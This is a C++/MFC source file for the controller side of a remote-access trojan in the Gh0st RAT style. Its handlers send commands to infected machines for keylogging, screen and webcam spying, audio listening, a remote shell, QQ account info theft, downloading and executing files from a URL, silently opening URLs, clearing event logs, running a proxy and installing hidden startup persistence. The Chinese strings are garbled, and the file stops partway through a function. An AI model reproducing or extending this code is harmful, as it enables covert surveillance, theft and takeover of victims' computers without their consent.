// PcView.cpp : implementation file
//

#include "stdafx.h"

#include "Client.h"
#include "PcView.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "InputDlg.h"
#include "LogView.h"
#include "122205622.h"
////////////////////
#include "MsgBox.h"
#include "Download.h"
#include "Openweb.h"
#include "ChangeGroup.h"
#include "MapDlg.h"
#include "MsgBox.h"
#include "OpenProxy.h"
#include "122205622View.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CWindsView* g_pTabView;
/////////////////////////////////////////////////////////////////////////////
// CPcView
extern LPBYTE lpFilePacket ;
extern LPBYTE lpScreenPacket;
extern LPBYTE lpKeyboardPacket;
extern LPBYTE lpWebCamPacket;
extern LPBYTE lpAudioPacket ;
extern LPBYTE lpShellPacket;
extern LPBYTE lpSysteminfoPacket;
extern LPBYTE lpSystemPacket;
extern LPBYTE lpServicePacket;
extern LPBYTE lpRegeditPacket;
extern LPBYTE lpTextChatPacket;
extern LPBYTE lpQqinfoPacket;
extern LPBYTE lpProxyMapPacket;


extern int nFilePacketLength;
extern int nScreenPacketLength;
extern int nKeyboardPacketLength;
extern int nWebCamPacketLength;
extern int nAudioPacketLength;
extern int nShellPacketLength;
extern int nSysteminfoPacketLength;
extern int nSystemPacketLength;
extern int nServicePacketLength;
extern int nRegeditPacketLength;
extern int nTextChatPacketLength;
extern int nQqinfoPacketLength;
extern int nProxyPacketLength;
IMPLEMENT_DYNCREATE(CPcView, CView)

	CPcView::CPcView()
{
}

CPcView::~CPcView()
{
}


BEGIN_MESSAGE_MAP(CPcView, CView)
	//{{AFX_MSG_MAP(CPcView)
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_WM_CONTEXTMENU()
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_VIDEOWALL, OnVideowall)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_SHELL, OnShell)
	ON_COMMAND(IDM_QQINFO, OnQqinfo)
	ON_COMMAND(IDM_START, OnStart)
	ON_COMMAND(ID_CHANGE_GROUP, OnChangeGroup)
	//ON_COMMAND(IDM_CHANGE_GROUP, OnChangeGroup)
	//ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	//ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_REGEDIT, OnRegedit)
	ON_COMMAND(IDM_SHOWMSG, OnShowmsg)
	ON_COMMAND(IDM_SYSTEMINFO, OnSysteminfo)
	ON_COMMAND(ID_REMARK, OnRemark)
	ON_COMMAND(IDM_PROXY_MAP, OnProxyMap)
	ON_COMMAND(IDM_PROXY, OnProxy)

	ON_COMMAND(ID_COPY_WANIP, OnCopyWanip)
	ON_COMMAND(ID_COPY_ALL, OnCopyAll)

	ON_COMMAND(ID_DOWNLOAD, OnDownload)
	ON_COMMAND(ID_OPENWEB, OnOpenweb)

	ON_COMMAND(ID_LOGOFF, OnLogoff)
	ON_COMMAND(ID_REBOOT, OnReboot)
	ON_COMMAND(ID_SHUTDOWN, OnShutdown)
	ON_COMMAND(ID_UNINSTALL, OnUninstall)
	/*ON_COMMAND(IDM_SERVICES, OnServices)
	ON_COMMAND(IDM_BUILDVIEW, OnBuild)


	
	
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_CLEANEVENT, OnCleanevent)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)*/
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	//ON_COMMAND(IDM_LANPROXY, OnLanProxy)
	//ON_COMMAND(IDM_START_HIDE, OnStartHide)
	//ON_COMMAND(IDM_START_NORMAL, OnStartNormal)
	//ON_COMMAND(IDM_NO_START, OnNoStart)
	//ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
	//ON_COMMAND(IDM_CREATE_GROUP, OnCreateGroup)
	//ON_COMMAND(IDM_DELETE_GROUP, OnDeleteGroup)
	//ON_COMMAND(IDM_SELGROUP, OnSelgroup)
	//ON_COMMAND(IDM_FIND_PROCESS, OnFindProcess)
	//ON_COMMAND(IDM_FIND_WINDOW, OnFindWindow)
	//}}AFX_MSG_MAP
	
//	ON_WM_RBUTTONDOWN()

END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcView drawing

void CPcView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CPcView diagnostics

#ifdef _DEBUG
void CPcView::AssertValid() const
{
	CView::AssertValid();
}

void CPcView::Dump(CDumpContext& dc) const
{
	CView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPcView message handlers

int CPcView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;

	// TODO: Add your specialized creation code here
	m_List.Create(WS_CHILD | WS_VISIBLE,CRect(0,0,0,0),this,0x100);	
	m_List.InitializeGrid();

	return 0;
}

void CPcView::OnSize(UINT nType, int cx, int cy) 
{
	CView::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if(m_List.GetSafeHwnd())
		m_List.SetWindowPos(0,-1,-1,cx,cy,SWP_SHOWWINDOW);

}


void CPcView::OnContextMenu(CWnd* pWnd, CPoint point) 
{
	// TODO: Add your message handler code here


	UINT uiGroupFind2[] = {IDM_FILEMANAGER,IDM_SCREENSPY,IDM_KEYBOARD,IDM_SHELL,IDM_SYSTEMINFO,IDM_SYSTEM,
		IDM_SERVICEMANAGER,IDM_REGEDIT
	};

	UINT uiBitGroup[] = {IDB_FILEMANAGER,IDB_SCREENSPY,IDB_KEYBOARD,IDB_SHELL,IDB_SYSTEMINFO,IDB_SYSTEM,
		IDB_SERVICEMANAGER,IDB_REGEDIT};
	// ԭ�� ������û��ʵ��ͼ����ʾ
	if(point.x == -1 && point.y == -1)
	{
		CRect rect;
		GetClientRect(rect);
		ClientToScreen(rect);
		point = rect.TopLeft();
		point.Offset(5,5);

	}

	CMenu menu;
	VERIFY(menu.LoadMenuA(IDR_MENU_LIST));

	CMenu * pPopup = menu.GetSubMenu(0);
	ASSERT(pPopup != NULL);
	CWnd* pWndPopupOwner = this;
	while (pWndPopupOwner->GetStyle() & WS_CHILD)
		pWndPopupOwner = pWndPopupOwner->GetParent();



	

	for(int i = 0 ; i < 10; i++){
	my_Bit.LoadBitmapA(uiBitGroup[i]);
	pPopup->SetMenuItemBitmaps(uiGroupFind2[i],MF_BYCOMMAND,&my_Bit,&my_Bit);
	}



	pPopup->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON , point.x, point.y,pWndPopupOwner);

	//CXTPCommandBars::TrackPopupMenu(pPopup,0, point.x, point.y,this);

	//CPoint p;
	//GetCursorPos(&p);
	//
	//CMenu menu;
	//VERIFY(menu.LoadMenu(IDR_MENU_LIST));
	//
	//CMenu* pPopup = menu.GetSubMenu(0);
	//ASSERT(pPopup != NULL);
	//CWnd* pWndPopupOwner = this;
	//
	//while (pWndPopupOwner->GetStyle() & WS_CHILD)
	//	pWndPopupOwner = pWndPopupOwner->GetParent();
	//
	//CXTPCommandBars::TrackPopupMenu(pPopup, 0,  p.x, p.y, AfxGetMainWnd(), 0, pWndPopupOwner);

}
struct MSGBOX
{
	CHAR Title[200];
	CHAR szText[1000];
	UINT Type;
}MsgBox;
void CPcView::OnShowmsg() 
{
	// TODO: Add your command handler code here
	CMsgBox dlg;
one:
	if(dlg.DoModal() != IDOK) 
		return;

	if ((strlen(dlg.m_Title) < 1) | (strlen(dlg.m_Text) < 1))
	{
		MessageBox("�����뷢�ͱ��⼰����!!... ", "��ʾ! ", MB_OK | MB_ICONWARNING);
		goto one;
	}

	ZeroMemory(&MsgBox,sizeof(MSGBOX));
	strcpy(MsgBox.Title,dlg.m_Title.GetBuffer(0));
	strcpy(MsgBox.szText,dlg.m_Text.GetBuffer(0));
	MsgBox.Type = dlg.m_msgButton|dlg.m_msgIcon;

	BYTE	*bToken = new BYTE[sizeof(MSGBOX)+1];
	bToken[0]= COMMAND_SHOW_MSG;
	memcpy(&bToken[1],&MsgBox,sizeof(MSGBOX));

	m_List.SendSelectCommand(bToken, sizeof(MSGBOX)+1);
	delete bToken;
	goto one;
}

void CPcView::OnFilemanager() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_LIST_DRIVE;
	m_List.SendSelectCommand(lpFilePacket , nFilePacketLength );
}
void CPcView::OnScreenspy() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_SCREEN_SPY;
	m_List.SendSelectCommand(lpScreenPacket , nScreenPacketLength);
}

void CPcView::OnVideowall()
{
	// TODO: �ڴ���������������
	m_List.SendSelectCommand(lpScreenPacket,nScreenPacketLength);

}

void CPcView::OnKeyboard() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_KEYBOARD;
	m_List.SendSelectCommand(lpKeyboardPacket , nKeyboardPacketLength);
}

void CPcView::OnRemoteshell() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_SHELL;
	m_List.SendSelectCommand(lpShellPacket , nShellPacketLength);
}
void CPcView::OnQqinfo() 
{
	// TODO: Add your command handler code here
	m_List.SendSelectCommand(lpQqinfoPacket , nQqinfoPacketLength );
}

void CPcView::OnSystem() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_SYSTEM;
	m_List.SendSelectCommand(lpSystemPacket , nSystemPacketLength);
}
void CPcView::OnShell() 
{
	// TODO: Add your command handler code here
	m_List.SendSelectCommand(lpShellPacket , nShellPacketLength  );
}
void CPcView::OnWebcam() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_WEBCAM;
	m_List.SendSelectCommand(lpWebCamPacket , nWebCamPacketLength);
}
void CPcView::OnSysteminfo() 
{
	// TODO: Add your command handler code here
	m_List.SendSelectCommand(lpSysteminfoPacket , nSysteminfoPacketLength  );
}
void CPcView::OnAudioListen() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_AUDIO;
	m_List.SendSelectCommand(lpAudioPacket , nAudioPacketLength);	
}

void CPcView::OnRegedit() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_REGEDIT;
	m_List.SendSelectCommand(lpRegeditPacket , nRegeditPacketLength);
}
void CPcView::OnServices() 
{
	// TODO: Add your command handler code here
	//BYTE	bToken = COMMAND_SERVICES;
	//m_List.SendSelectCommand(&bToken, sizeof(BYTE));
}
void CPcView::OnProxyMap() 
{
	// TODO: Add your command handler code here
	m_List.SendSelectCommand(lpProxyMapPacket , nProxyPacketLength );
}

void CPcView::OnLogoff() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	m_List.SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnReboot() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	m_List.SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnShutdown() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	m_List.SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnUninstall() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("ȷ��ж�ط������ -:)"), _T("Warning"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_UNINSTALL;
	m_List.SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::SetClipboardText(CString &Data)
{
	if(::OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}
void CPcView::OnCopyWanip() 
{
	m_List.SendSelectCopy(true);
	
	MessageBox("����IP�Ѹ��Ƶ����а�");
}

void CPcView::OnCopyAll() 
{
	
	
	m_List.SendSelectCopy(false);
	MessageBox("������Ϣ�Ѹ��Ƶ����а�");
}
void CPcView::OnDownload() 
{
	// TODO: Add your command handler code here
	CDownload dlg;
	if ( dlg.DoModal() == IDOK )
	{
		int		nPacketLength = dlg.m_Downaddress.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];

		char p[20];
		sprintf(p,"%d",dlg.Down);

		OutputDebugString(p);

		switch(dlg.Down)
		{
		case 0:
			lpPacket[0] = COMMAND_DOWN_EXEC;//����ִ��
			break;
		case 1:
			lpPacket[0] = COMMAND_DOWN_UPDATE;//���ظ���
			break;
		default:
			break;
		}
		memcpy(lpPacket + 1, dlg.m_Downaddress.GetBuffer(0), nPacketLength - 1);
		m_List.SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
	}
}

void CPcView::OnOpenweb() 
{
	// TODO: Add your command handler code here
	COpenweb dlg;
	if ( dlg.DoModal() == IDOK )
	{
		int		nPacketLength = dlg.m_Webaddress.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];

		switch(dlg.Webtype)
		{
		case 0:
			lpPacket[0] = COMMAND_OPEN_URL_SHOW;//����ҳ����ʾ��
			break;
		case 1:
			lpPacket[0] = COMMAND_OPEN_URL_HIDE;//����ҳ�����أ�
			break;
		default:
			break;
		}
		memcpy(lpPacket + 1, dlg.m_Webaddress.GetBuffer(0), nPacketLength - 1);
		m_List.SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
	}
}
#include "..\Bin\Plugins\C_PROXY.h"
void CPcView::OnProxy() 
{
	// TODO: Add your command handler code here
	COpenProxy dlg;	

	int nRet = dlg.DoModal();
	if(nRet == IDOK) 
	{
		char szToken[99];
		memset(szToken,0,sizeof(szToken));
		// �����Ҫ��֤
		if (dlg.m_check_verify)
		{
			if (dlg.m_edit_user.IsEmpty() || dlg.m_edit_pass.IsEmpty())
			{
				AfxMessageBox("��Ϣ��������");
				return;
			}
			wsprintf(szToken,"%d|%s|%s",dlg.m_edit_port,dlg.m_edit_user,dlg.m_edit_pass);
		}
		else
			wsprintf(szToken,"%d",dlg.m_edit_port);


		int nPacketLength = 100 + PROXYMyFileSize;
		LPBYTE lpPacket = new BYTE[nPacketLength];
		if(lpPacket == NULL)			return;
		lpPacket[0] = COMMAND_OPEN_PROXY;
		memcpy(lpPacket + 1, szToken, 99);
		memcpy(lpPacket + 100,PROXYMyFileBuf,PROXYMyFileSize);

		m_List.SendSelectCommand(lpPacket, nPacketLength);
		delete [] lpPacket; 
	}
	else if (nRet == IDNO)
	{
		BYTE bToken = COMMAND_CLOSE_PROXY;
		m_List.SendSelectCommand(&bToken,sizeof(bToken));
	}
}
//�ṹ��
struct START
{
	CHAR Startname[200];
	WORD FileAttribute;      //�ļ�����	
	WORD Enlarge;            //��װ����
}Start;

#include "Start.h"
void CPcView::OnStart() 
{
	// TODO: Add your command handler code here
	//POSITION pos = m_List->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	//if (pos==NULL)
	//	return;

	if (MessageBox(_T("ȷ��д�������𣿰�ȫ������ܻ����أ�����"), _T("��ʾ"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	CStart dlg;
one:
	if(dlg.DoModal() != IDOK) 
		return;

	if ((strlen(dlg.m_StartName) < 1))
	{
		MessageBox("�������ļ�����!!... ", "��ʾ! ", MB_OK | MB_ICONWARNING);
		goto one;
	}

	CString rString = dlg.m_strCur;

	ZeroMemory(&Start,sizeof(START));
	strcpy(Start.Startname,dlg.m_StartName.GetBuffer(0));



	if(rString == "����")
		Start.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if(rString == "����")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN;

	if(rString == "ϵͳ")
		Start.FileAttribute = FILE_ATTRIBUTE_SYSTEM;

	if(rString == "ֻ��")
		Start.FileAttribute = FILE_ATTRIBUTE_READONLY;

	if(rString == "����+ϵͳ")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;

	if(rString == "����+ϵͳ+ֻ��")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;

	Start.Enlarge=(WORD)dlg.m_Enlarge;


	BYTE	*bToken = new BYTE[sizeof(START)+1];
	bToken[0]= COMMAND_START;
	memcpy(&bToken[1],&Start,sizeof(START));

	m_List.SendSelectCommand(bToken, sizeof(START)+1);
	delete bToken;
	goto one;
}
void CPcView::OnBuild() 
{
	//g_pTabView->m_wndTabControl.SetCurSel(3);
}

void CPcView::OnRemove() 
{
	// TODO: Add your command handler code here
	//if (MessageBox("ȷ��ж�ط������ -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
	//	return;
	//BYTE	bToken = COMMAND_REMOVE;
	//m_List.SendSelectCommand(&bToken, sizeof(BYTE));
}

//void CPcView::OnLogoff() 
//{
//	// TODO: Add your command handler code here
//	BYTE bToken[2];
//	bToken[0] = COMMAND_SESSION;
//	bToken[1] = EWX_LOGOFF | EWX_FORCE;
//	m_List.SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
//}
//
//void CPcView::OnReboot() 
//{
//	// TODO: Add your command handler code here
//	BYTE bToken[2];
//	bToken[0] = COMMAND_SESSION;
//	bToken[1] = EWX_REBOOT | EWX_FORCE;
//	m_List.SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
//}
//
//void CPcView::OnShutdown() 
//{
//	// TODO: Add your command handler code here
//	BYTE bToken[2];
//	bToken[0] = COMMAND_SESSION;
//	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
//	m_List.SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
//}
void CPcView::OnDownexec() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("������"), _T("������Ҫ�����ļ��ĵ�ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	m_List.SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}

void CPcView::OnUpdateServer() 
{
	// TODO: Add your command handler code here
	//CInputDialog	dlg;
	//dlg.Init(_T("���ظ��·����"), _T("������Ҫ�����·���˵ĵ�ַ:"), this);
	//if (dlg.DoModal() != IDOK)   
	//	return;
	//dlg.m_str.MakeLower();
	//if (dlg.m_str.Find("http://") == -1)
	//{
	//	MessageBox("�������ַ���Ϸ�", "����");
	//	return;
	//}

	//int		nPacketLength = dlg.m_str.GetLength() + 2;
	//LPBYTE	lpPacket = new BYTE[nPacketLength];
	//lpPacket[0] = COMMAND_UPDATE_SERVER;
	//memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	//m_List.SendSelectCommand(lpPacket, nPacketLength);

	//delete[] lpPacket;
}

void CPcView::OnCleanevent() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	m_List.SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("Զ�̷�����ַ"), _T("������Ҫ���ط��ʵ���ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	m_List.SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}

void CPcView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("Զ�̷�����ַ"), _T("������Ҫ��ʾ���ʵ���ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	m_List.SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


void CPcView::OnLanProxy() 
{
	// TODO: Add your command handler code here
	//int proxy_port = ((CWindsApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenProxyPort", 10080);
	//int map_port = 10000;
	//CString str;
	//str.Format("%d|%d",proxy_port,map_port);
	//int		nPacketLength = str.GetLength() + 2;
	//LPBYTE	lpPacket = new BYTE[nPacketLength];
	//lpPacket[0] = COMMAND_PROXYANDMAP;
	//memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);

	//m_List.SendSelectCommand(lpPacket, nPacketLength);

	//delete[] lpPacket;
}

///////////////////////////////////////////////////////////////////////
void CPcView::OnSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_List.GetItemCount(); i++)   
	{   
		m_List.SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);   
	}
}

void CPcView::OnUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_List.GetItemCount(); i++)   
	{   
		m_List.SetItemState(i, 0, LVIS_SELECTED);
	}
}
void CPcView::OnRemark() 
{
	// TODO: Add your command handler code here
	if(m_List.GetSelectedCount() == NULL)
	{
		AfxMessageBox("��ѡ������!");
		return ;
	}
	CString strTitle;
	if (m_List.GetSelectedCount() == 1)
		strTitle.Format("��������(%s)�ı�ע", m_List.GetItemText(m_List.GetSelectionMark(), 0));
	else
		strTitle = "��������������ע";
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("�������µı�ע:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	m_List.SendSelectCommand(lpPacket, nPacketLength);

	POSITION pos = m_List.GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		m_List.SetItemText(nItem, 2, dlg.m_str);
	}

	delete[] lpPacket;
}

void CPcView::OnChangeGroup() 
{	
	if (!m_List.GetCount())
		return;
	CChangeGroup dlg;


	if (dlg.DoModal() == IDOK || dlg.strGroup.GetLength()!= 0)
	{
		m_List.ChangeGroup(dlg.strGroup.GetBuffer(0));


		int		nPacketLength = dlg.strGroup.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, dlg.strGroup.GetBuffer(0), nPacketLength - 1);

		m_List.SendSelectCommand(lpPacket, nPacketLength);

		delete[] lpPacket;
	}

	//	m_List.ChangeGroup("Fuck");	
}


void CPcView::OnCreateGroup() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("��������"), _T("�������������"), this);
	if (dlg.DoModal() == IDOK)
	{
		m_List.NewGroup(dlg.m_str);
	}
}

void CPcView::OnDeleteGroup() 
{
	// TODO: Add your command handler code here
	if (!m_List.GetCount())
		return;
	m_List.DeleteGroup(m_List.GetSelectedItem());
}


void CPcView::OnFindProcess() 
{
	// TODO: Add your command handler code here
	/*if (!m_List.GetSelectedItem())
	return;
	CInputDialog dlg;
	dlg.Init(_T("���ҽ���(�ҵ����ڻ�����ǰ��ʾ*��)"), _T("������Ҫ���ҵĽ�����(����qq.exe):"), this);
	if (dlg.DoModal() == IDOK)
	{
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_FIND_PROCESS;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	m_List.SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
	}*/
}

void CPcView::OnFindWindow() 
{
	// TODO: Add your command handler code here
	//if (!m_List.GetSelectedItem())
	//	return;
	//CInputDialog dlg;
	//dlg.Init(_T("���Ҵ���(�ҵ����ڻ�����ǰ��ʾ*��)"), _T("������Ҫ���ҵĴ��ڱ������������:"), this);
	//if (dlg.DoModal() == IDOK)
	//{
	//	int		nPacketLength = dlg.m_str.GetLength() + 2;
	//	LPBYTE	lpPacket = new BYTE[nPacketLength];
	//	lpPacket[0] = COMMAND_FIND_WINDOW;
	//	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	//	m_List.SendSelectCommand(lpPacket, nPacketLength);
	//	delete[] lpPacket;
	//}
}

void CPcView::OnSelgroup() 
{
	// TODO: Add your command handler code here
	if (!m_List.GetCount())
		return;
	m_List.SelAllOnGroup(m_List.GetSelectedItem());
}

void CPcView::OnStartHide() 
{
	// TODO: Add your command handler code here
	AfxMessageBox("���ϴ���Զ�̵���ϵͳ�̵�Program Files�ļ����£�������ļ�����ʱ���м������������ĵȺ�");

	//CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"��ִ���ļ�|*.exe", NULL);
	//if(dlg->DoModal () != IDOK) 
	//	return;
	//unsigned char *data = NULL;   
	//size_t size;   

	//FILE *file=fopen(dlg->GetPathName(),"rb");
	//if (file == NULL)   
	//{   
	//	AfxMessageBox("�ļ���ȡʧ�ܣ�");  
	//	return;  
	//}
	//fseek(file, 0, SEEK_END);   
	//size = ftell(file);   
	//data = (unsigned char *)malloc(size);   
	//fseek(file, 0, SEEK_SET);   
	//fread(data, 1, size, file);
	//fclose(file);

	//int		nPacketLength = size + 2;
	//LPBYTE	lpPacket = new BYTE[nPacketLength];
	//lpPacket[0] = COMMAND_SENDFILE_HIDE;
	//memcpy(lpPacket + 1, data, nPacketLength - 1);

	//m_List.SendSelectCommand(lpPacket, nPacketLength);
	//if (data)
	//	free(data);
	//delete[] lpPacket;
	//delete dlg;
}

void CPcView::OnStartNormal() 
{
	// TODO: Add your command handler code here
	AfxMessageBox("���ϴ���Զ�̵���ϵͳ�̵�Program Files�ļ����£�������ļ�����ʱ���м������������ĵȺ�");

	//CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"��ִ���ļ�|*.exe", NULL);
	//if(dlg->DoModal () != IDOK) 
	//	return;
	////	AfxMessageBox(dlg->GetPathName());
	//unsigned char *data = NULL;   
	//size_t size;   

	//FILE *file=fopen(dlg->GetPathName(),"rb");
	//if (file == NULL)   
	//{   
	//	AfxMessageBox("�ļ���ȡʧ�ܣ�");  
	//	return;  
	//}
	//fseek(file, 0, SEEK_END);   
	//size = ftell(file);   
	//data = (unsigned char *)malloc(size);   
	//fseek(file, 0, SEEK_SET);   
	//fread(data, 1, size, file);
	//fclose(file);

	//int		nPacketLength = size + 2;
	//LPBYTE	lpPacket = new BYTE[nPacketLength];
	//lpPacket[0] = COMMAND_SENDFILE_NORMAL;
	//memcpy(lpPacket + 1, data, nPacketLength - 1);

	//m_List.SendSelectCommand(lpPacket, nPacketLength);
	//if (data)
	//	free(data);
	//delete[] lpPacket;
	//delete dlg;
}

void CPcView::OnNoStart() 
{
	// TODO: Add your command handler code here
	AfxMessageBox("���ϴ���Զ�̵���ϵͳ�̵�Program Files�ļ����£�������ļ�����ʱ���м������������ĵȺ�");

	//CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"��ִ���ļ�|*.exe", NULL);
	//if(dlg->DoModal () != IDOK) 
	//	return;
	////	AfxMessageBox(dlg->GetPathName());
	//unsigned char *data = NULL;   
	//size_t size;   

	//FILE *file=fopen(dlg->GetPathName(),"rb");
	//if (file == NULL)   
	//{   
	//	AfxMessageBox("�ļ���ȡʧ�ܣ�");  
	//	return;  
	//}
